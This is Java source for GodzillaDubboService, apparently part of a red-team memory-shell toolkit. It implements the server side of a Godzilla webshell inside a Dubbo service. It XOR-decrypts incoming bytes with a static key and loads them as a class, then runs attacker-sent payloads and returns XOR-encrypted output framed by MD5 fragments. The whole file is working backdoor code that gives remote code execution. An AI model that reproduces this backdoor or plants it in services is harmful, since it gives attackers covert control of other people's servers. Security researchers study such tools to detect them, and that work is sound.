package com.reajason.javaweb.memshell.shelltool.godzilla;

import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.io.UnsupportedEncodingException;
import java.util.Base64;

/**
 * @author ReaJason
 */
public class GodzillaDubboService extends ClassLoader {
    private static String key;
    private static String md5;
    private static Class<?> payload;

    public GodzillaDubboService() {
    }

    public GodzillaDubboService(ClassLoader z) {
        super(z);
    }

    public byte[] handle(byte[] bytes) {
        if (bytes == null || bytes.length == 0) {
            return new byte[0];
        }
        try {
            byte[] data = decrypt(bytes, key);
            if (payload == null) {
                payload = new GodzillaDubboService(Thread.currentThread().getContextClassLoader()).defineClass(data, 0, data.length);
                return "ok".getBytes("UTF-8");
            } else {
                ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                Object f = payload.newInstance();
                f.equals(arrOut);
                f.equals(data);
                f.toString();
                byte[] byteArray = arrOut.toByteArray();
                return (md5.substring(0, 16) + encrypt(byteArray, key) + md5.substring(16)).getBytes("UTF-8");
            }
        } catch (Throwable e) {
            try {
                return getErrorMessage(e).getBytes("UTF-8");
            } catch (UnsupportedEncodingException ignored) {
            }
        }
        return new byte[0];
    }

    public static String encrypt(byte[] data, String key) {
        byte[] keyBytes = key.getBytes();
        byte[] xored = new byte[data.length];

        for (int i = 0; i < data.length; i++) {
            xored[i] = (byte) (data[i] ^ keyBytes[i % keyBytes.length]);
        }
        return Base64.getEncoder().encodeToString(xored);
    }

    public static byte[] decrypt(byte[] ciphertext, String key) {
        byte[] data = Base64.getDecoder().decode(ciphertext);
        byte[] keyBytes = key.getBytes();
        byte[] result = new byte[data.length];

        for (int i = 0; i < data.length; i++) {
            result[i] = (byte) (data[i] ^ keyBytes[i % keyBytes.length]);
        }
        return result;
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}